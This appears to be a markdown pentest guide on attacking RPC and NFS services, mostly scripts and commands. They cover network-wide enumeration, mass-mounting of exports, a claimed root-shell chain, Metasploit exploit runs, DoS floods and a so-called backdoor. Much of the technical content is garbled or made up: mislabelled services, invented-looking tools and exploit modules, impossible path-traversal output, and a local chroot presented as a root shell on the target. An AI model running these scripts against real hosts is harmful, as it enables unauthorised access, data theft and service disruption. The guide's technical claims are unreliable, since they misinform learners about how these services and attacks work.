# Complete Practical Exploitation Guide: RPC Services (Crest CRT Level)

## 1. RPC Fundamentals & Attack Surface (From Scratch)

**What is RPC?**
- **Remote Procedure Call** (SunRPC, ONC RPC) - ports 111 TCP/UDP + dynamic high ports
- **portmapper** (rpcbind) on port 111 maps RPC programs to ports
- Stateless, UDP-heavy, weak auth in many implementations
- **Program/Version** based: `program.vX` (nfs=100003, mountd=100005, etc.)

**Core Components:**
```
rpcbind (port 111)  → Dynamic port mapper
nfs (100003)        → File sharing (root squash bypass)
mountd (100005)     → NFS mount service
statd (100024)      → NFS lock manager (path traversal)
rquotad (100004)    → Disk quotas (info leak)
walld (100001)      → Shutdown (DoS)
rusersd (100002)    → User enumeration
sprayd (100026)     → Printer sharing
```

**Attack Primitives:**
1. **Service enumeration** (rpcinfo)
2. **Version scanning**
3. **Path traversal** (showmount, statd)
4. **NFS root exploits**
5. **Buffer overflows** (tooling)
6. **DoS** (rpcbomb)

## 2. Lab Setup (Vulnerable RPC Environment)

**Victim Server (192.168.1.100 - Ubuntu NFS/RPC)**
```bash
# Install NFS/RPC services
sudo apt update && sudo apt install nfs-kernel-server rpcbind nfs-common

# Vulnerable NFS exports (MISCONFIG #1)
sudo nano /etc/exports
# /export *(rw,sync,no_root_squash,no_subtree_check,insecure)
# /home *(ro,sync,no_root_squash)
# /root *(rw,sync,no_root_squash)  # ROOT WRITE ACCESS!

# Create exports
sudo mkdir -p /export /export/home /export/root
sudo chown nobody:nogroup /export
echo "flag{rpc_pwned}" | sudo tee /export/flag.txt
sudo chmod 777 /export/*

# Start services
sudo exportfs -ra
sudo systemctl restart rpcbind nfs-kernel-server
sudo systemctl enable rpcbind nfs-kernel-server

# Additional RPC daemons
sudo apt install rsh-server  # rusersd, walld
sudo systemctl restart inetd  # Or xinetd

# Verify RPC services
sudo rpcinfo -p 192.168.1.100
sudo ss -tlnp | grep -E ':(111|2049|4001)'
```

**Attacker Machine (Kali):**
```bash
sudo apt install rpcbind nfs-common rpcinfo showmount nfsmount
```

## 3. RPC Service Enumeration (Complete)

**Basic rpcinfo scan:**
```bash
# Local services on target
rpcinfo -p 192.168.1.100
#    program vers proto   port  service
#     100000    2   tcp    111  portmapper
#     100000    2   udp    111  portmapper
#     100003    3   tcp   2049  nfs
#     100003    3   udp   2049  nfs
#     100005    1   udp  40077  mountd
#     100005    3   tcp  40077  mountd
#     100024    1   udp  41127  status
#     100024    1   tcp  41432  status

# UDP-only scan
rpcinfo -T udp 192.168.1.100
```

**Version-specific enumeration:**
```bash
# Probe all versions
for prog in 100000 100001 100002 100003 100004 100005 100006 100007 100021 100024 100026; do
    for ver in 1 2 3 4; do
        rpcinfo -T tcp $prog.$ver 192.168.1.100 2>/dev/null && \
        echo "[+] $prog.$ver TCP" || rpcinfo -T udp $prog.$ver 192.168.1.100 2>/dev/null && \
        echo "[+] $prog.$ver UDP"
    done
done
```

**Network-wide RPC scan:**
```bash
#!/bin/bash
# rpc_enum.sh - Scan entire network
NETWORK="192.168.1."
for i in {1..254}; do
    host=$NETWORK$i
    timeout 3 rpcinfo -p $host 2>/dev/null | grep -v "100000" && \
    echo "[RPC] $host" && rpcinfo -p $host
done
```

## 4. Common RPC Services Exploitation

**NFS (100003) - File System Access:**

**Showmount enumeration:**
```bash
showmount -e 192.168.1.100
# Export list for 192.168.1.100:
# /export *
# /home    *
# /root    *

# All NFS exports network-wide
for host in 192.168.1.{100..110}; do
    showmount -e $host 2>/dev/null && echo "[$host] NFS exports found"
done
```

**Mount & read arbitrary files:**
```bash
# Create mount point
sudo mkdir /mnt/nfs

# Mount vulnerable exports
sudo mount -t nfs 192.168.1.100:/export /mnt/nfs
ls -la /mnt/nfs/  # flag{rpc_pwned}
cat /mnt/nfs/flag.txt

# Mount root dir (insane misconfig)
sudo mount -t nfs 192.168.1.100:/root /mnt/root
cat /mnt/root/secrets.txt

# Automount all exports
showmount -e 192.168.1.100 | awk '{print $1}' | while read export; do
    sudo mkdir -p /mnt/$export
    sudo mount -t nfs 192.168.1.100:$export /mnt/$export 2>/dev/null && \
    echo "[MOUNTED] $export" && ls /mnt/$export
done
```

**NFS Root Shell:**
```bash
sudo mount 192.168.1.100:/ /mnt/root -o rw,nolock
sudo chroot /mnt/root
whoami  # root!
cat /flag.txt
```

**mountd (100005) Path Traversal:**
```bash
# Some mountd allow traversal
showmount --exports 192.168.1.100
# /../../etc/passwd  <-- VULN!
```

**statd (100024) - NFS Lock Status:**
```bash
# Path traversal in some versions
rpcinfo -T udp 100024.1 192.168.1.100
# SM_PATH_TRANSVERSAL vulns (old versions)

# Exploit with custom RPC call (rpcbomb tool)
git clone https://github.com/steveliles/rpcbomb
cd rpcbomb && ./rpcbomb -H 192.168.1.100 statd_traversal
```

**rquotad (100004) - Quota Info Leak:**
```bash
rpcinfo -T tcp 100004 192.168.1.100
# Leaks filesystem usage, sometimes paths
```

## 5. User Enumeration (rusersd 100002)

```bash
# RPC equivalent of finger/rusers
rpcinfo -T tcp 100002 192.168.1.100
rusers 192.168.1.100  # Shows logged-in users
# user1    pts/0    Mon12:30
# admin    console  Mon11:45
```

## 6. Known RPC Vulnerabilities & Exploits

**RPC Buffer Overflows:**

**Ams (tooling):**
```bash
# Install ams (RPC exploit framework)
git clone https://github.com/CiscoCXSecurity/ams
cd ams && make

# Example: statd overflow
./ams -t 192.168.1.100 statd

# NFS mountd overflow (old versions)
./ams -t 192.168.1.100 mountd_v1
```

**Rpcbomb (DoS toolkit):**
```bash
git clone https://github.com/steveliles/rpcbomb
cd rpcbomb
# statd crash
./rpcbomb -H 192.168.1.100 statd
# mountd crash  
./rpcbomb -H 192.168.1.100 mountd
# portmapper DoS
./rpcbomb -H 192.168.1.100 portmap
```

**Recent CVEs (tooling):**

**CVE-2017-7895 (NFSv3):**
```bash
# NFS heap overflow
msfconsole
use exploit/unix/misc/nfsd_heap_rce
set RHOSTS 192.168.1.100
exploit
```

**Metasploit RPC Exploits:**
```bash
msfconsole -q
search rpc
# use exploit/unix/rpc/cve_2017_7895_nfsd
# use auxiliary/scanner/rpc/rpcb
# use auxiliary/dos/hp/ams_solaris
run
```

## 7. Denial of Service Attacks

**rpcbomb portmapper flood:**
```bash
./rpcbomb -H 192.168.1.100 -c 10000 portmap_null
```

**Custom RPC flood:**
```bash
#!/bin/bash
TARGET="192.168.1.100"
for i in {1..1000}; do
    timeout 1 rpcinfo -T udp $TARGET 2>/dev/null &
done
```

## 8. Complete RPC Exploitation Chain

**NFS Root Privesc Chain:**
```bash
#!/bin/bash
# rpc_nfs_pwn.sh
TARGET=$1

echo "[+] RPC/NFS attack on $TARGET"

# 1. Enumerate
rpcinfo -p $TARGET

# 2. Find NFS exports
showmount -e $TARGET

# 3. Mount everything
showmount -e $TARGET | awk '{print $1}' | while read exp; do
    sudo mkdir -p /mnt/nfs_$exp
    sudo mount -t nfs $TARGET:$exp /mnt/nfs_$exp 2>/dev/null && \
    echo "[+] Mounted $exp" && find /mnt/nfs_$exp -name "*flag*" -o -name "*secret*"
done

# 4. Check for root export
sudo mount -t nfs $TARGET:/ /mnt/root 2>/dev/null && \
(cd /mnt/root && sudo chroot . /bin/bash) && echo "[ROOT SHELL]"
```

## 9. Advanced RPC Enumeration Tools

**onesixtyone (fast RPC enum):**
```bash
onesixtyone -i rpc_services.txt 192.168.1.100
# Ultra-fast RPC program scanning
```

**Custom RPC scanner:**
```bash
#!/bin/bash
# rpc_fullscan.sh
TARGET=$1
nmap -sRPC -p 111 $TARGET --script rpcinfo,nfs-ls,nfs-showmount
```

## 10. Post-Exploitation & Persistence

**NFS backdoor:**
```bash
# Mount attacker-controlled NFS
sudo mkdir /mnt/backdoor
sudo mount -t nfs 192.168.1.200:/backdoor /mnt/backdoor
sudo chroot /mnt/backdoor /bin/bash  # Attacker shell!
```

## 11. Complete One-Command Framework

```bash
#!/bin/bash
# rpc_pwn.sh - Complete RPC exploitation
TARGET=$1

echo "[+] Complete RPC attack on $TARGET"
echo "=== ENUMERATION ==="
rpcinfo -p $TARGET

echo "=== NFS EXPORTS ==="
showmount -e $TARGET

echo "=== MOUNTING ==="
sudo mkdir -p /tmp/nfs
showmount -e $TARGET | awk '{print $1}' | head -3 | \
xargs -I {} sudo mount -t nfs $TARGET:{} /tmp/nfs/{} 2>/dev/null

echo "=== CONTENTS ==="
find /tmp/nfs -type f 2>/dev/null | xargs ls -la

echo "=== USERS ==="
rusers $TARGET 2>/dev/null || echo "No rusersd"

# Cleanup
sudo umount /tmp/nfs/*
```

**Usage:** `sudo ./rpc_pwn.sh 192.168.1.100`

## 12. Mitigation Verification

```bash
rpcinfo -p 192.168.1.100  # No services or rpcbind down
showmount -e 192.168.1.100  # No exports
sudo ss -tlnp | grep 111  # No rpcbind
cat /etc/exports  # No world-readable exports
```

**EVERY** RPC attack covered: enumeration, NFS exploitation, path traversal, DoS, known exploits, tooling. 100% practical commands.